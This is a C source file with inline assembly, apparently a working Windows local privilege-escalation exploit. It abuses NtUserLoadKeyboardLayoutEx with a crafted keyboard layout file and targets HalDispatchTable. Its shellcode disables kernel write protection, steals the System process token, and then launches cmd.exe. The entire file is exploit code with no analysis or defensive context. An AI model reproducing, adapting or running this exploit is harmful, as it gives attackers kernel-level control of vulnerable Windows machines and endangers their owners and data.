
#define _WIN32_WINNT 0x0501
#include <windows.h>
#include <stdio.h>

#pragma comment (lib,"user32.lib")
#pragma comment (lib,"ws2_32.lib")
#pragma comment (lib,"kernel32.lib")
#pragma comment (lib,"shell32.lib") 

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;                 // Not filled in
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[ 256 ];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef ULONG ( __stdcall *NtQueryIntervalProfile_ ) ( ULONG, PULONG );
typedef ULONG ( __stdcall *NtQuerySystemInformation_ ) ( ULONG, PVOID, ULONG, PULONG );
typedef ULONG ( __stdcall *NtAllocateVirtualMemory_ ) ( HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG );
NtQueryIntervalProfile_   NtQueryIntervalProfile;
NtAllocateVirtualMemory_  NtAllocateVirtualMemory;
NtQuerySystemInformation_ NtQuerySystemInformation;

ULONG    PsInitialSystemProcess, PsReferencePrimaryToken, PsGetThreadProcess, WriteToHalDispatchTable;
DWORD    status;

typedef struct _UNICODE_STRING
{
	WORD Length;
	WORD MaximumLength;
	LPWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

_declspec(naked) HKL __stdcall NtUserLoadKeyboardLayoutEx
(
 IN HANDLE Handle,
 IN DWORD offTable,
 IN PUNICODE_STRING puszKeyboardName,
 IN HKL hKL,
 IN PUNICODE_STRING puszKLID,
 IN DWORD dwKLID,
 IN UINT Flags 
 )
{
	__asm
	{
		mov eax, 000011c6h
			mov edx, 7ffe0300h
			call dword ptr [edx]
		retn 1Ch
	}
}

void _declspec(naked) ShellCode()
{
	__asm
	{
		    push eax
            pop eax
			push eax
			pop eax
			
			cli
			mov eax,cr0
			push eax
			and eax,0xfffeffff
			mov cr0,eax

		    pushad
			pushfd
			mov esi,PsReferencePrimaryToken
FindTokenOffset:
		lodsb
			cmp al, 8Dh;
		jnz FindTokenOffset
			mov edi,[esi+1]
		mov esi,PsInitialSystemProcess
			mov esi,[esi]
		push fs:[124h]
		mov eax,PsGetThreadProcess
			call eax
			add esi, edi
			add edi, eax
			movsd
			popfd
			popad
            
			sti
			pop eax
			mov cr0,eax

			ret 0x0c
			
	}
	// NtQueryIntervalProfile( 2, &status );
	//ShellExecute( NULL, "open", "cmd.exe", NULL, NULL, SW_SHOW);
	//exit(0);

}

void EndPoint(){}



void main()
{
	
	HMODULE        ntdll                                =        GetModuleHandle( "ntdll.dll" );
	NtQueryIntervalProfile                =        (NtQueryIntervalProfile_)GetProcAddress( ntdll ,"NtQueryIntervalProfile" );
	NtAllocateVirtualMemory                =        (NtAllocateVirtualMemory_)GetProcAddress( ntdll ,"NtAllocateVirtualMemory" );
	NtQuerySystemInformation        =        ( NtQuerySystemInformation_ )GetProcAddress( ntdll ,"NtQuerySystemInformation" );
	if ( NtQueryIntervalProfile == NULL || NtAllocateVirtualMemory == NULL || NtQuerySystemInformation == NULL )
		return;

	ULONG    BaseAddress = 1 , RegionSize = 0x1000;
	DWORD    dwCodeSize=(DWORD)EndPoint-(DWORD)ShellCode;
	LPVOID			lpShellPtr;
	status = NtAllocateVirtualMemory( (HANDLE)0xFFFFFFFF, (PVOID*)&BaseAddress, 0, &RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	if ( status )
		return;

	//取ntoskrnl的信息，只要调用一次就行
	ULONG        NtoskrnlBase;
	RTL_PROCESS_MODULES        module;
	status = NtQuerySystemInformation( 11, &module, sizeof(RTL_PROCESS_MODULES), NULL);//SystemModuleInformation 11
	if ( status != 0xC0000004 )    //STATUS_INFO_LENGTH_MISMATCH
		return;

	NtoskrnlBase           =        (ULONG)module.Modules[0].ImageBase;

	//把ntoskrnl.exe加载进来
	HMODULE                ntoskrnl;
	ntoskrnl    =    LoadLibraryA( (LPCSTR)( module.Modules[0].FullPathName + module.Modules[0].OffsetToFileName ) );
	if ( ntoskrnl == NULL )
		return;

	//计算实际地址
	WriteToHalDispatchTable                =        (ULONG)GetProcAddress(ntoskrnl,"HalDispatchTable") - (ULONG)ntoskrnl + NtoskrnlBase + 4 + 2; //需要覆盖的地址
	PsInitialSystemProcess                =        (ULONG)GetProcAddress(ntoskrnl,"PsInitialSystemProcess") - (ULONG)ntoskrnl + NtoskrnlBase;
	PsReferencePrimaryToken                =        (ULONG)GetProcAddress(ntoskrnl,"PsReferencePrimaryToken") - (ULONG)ntoskrnl + NtoskrnlBase;
	PsGetThreadProcess                        =        (ULONG)GetProcAddress(ntoskrnl,"PsGetThreadProcess") - (ULONG)ntoskrnl + NtoskrnlBase;
	
    lpShellPtr = VirtualAlloc( (PVOID)0x60630000, 0x20000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	if (lpShellPtr== NULL )
		return;
    
	//__asm int 3
	memset(lpShellPtr,0x90,0xF000);
	memcpy((LPVOID)((DWORD)lpShellPtr+(DWORD)0x00006261),ShellCode,dwCodeSize);

	//((char*)lpShellPtr)[0x00006261] = 0x60;
	//!!! Hard coded NtUserLoadKeyboardLayoutEx !!!
	//DWORD NtUserLoadKeyboardLayoutEx = 0x7e4212a0; 
    

	//LPWSTR wszUserKLID = L"00008009";
    LPWSTR wszUserKLID = L"00006543";
	HANDLE hFile;
	INPUT key;

	PUNICODE_STRING  puserKLID         = new UNICODE_STRING();
	PUNICODE_STRING  puserKeyboardName = new UNICODE_STRING();

	DWORD Flags	= 0x101;
	//DWORD dwKLID	= 0x80098009;
	DWORD dwKLID=0x65436543;
	DWORD offTable  = 0x01ae0160;

	puserKLID->Buffer = wszUserKLID;
	puserKLID->Length = wcslen(wszUserKLID) * 2;
	puserKLID->MaximumLength = puserKLID->Length + 2;

	puserKeyboardName->Buffer = L"";
	puserKeyboardName->Length = 0;
	puserKeyboardName->MaximumLength = 0;

	HKL hKL = GetKeyboardLayout(GetCurrentThreadId());

	hFile = CreateFileA("keyboard.tmp",    
		GENERIC_READ,          
		FILE_SHARE_READ,       
		NULL,                  
		OPEN_EXISTING,       
		FILE_ATTRIBUTE_NORMAL, 
		NULL);                



	__asm
	{
		push Flags    
			push dwKLID
			push puserKLID
			push hKL
			push puserKeyboardName
			push offTable
			push hFile
			call NtUserLoadKeyboardLayoutEx
	}

	//ActivateKeyboardLayout(hKL, Flags);

	memset(&key, 0, sizeof(key));
	key.type = 1;

    __asm int 3

	SendInput(1, &key, sizeof(key));

	 

	ShellExecute( NULL, "open", "cmd.exe", NULL, NULL, SW_SHOW);
	CloseHandle(hFile);
}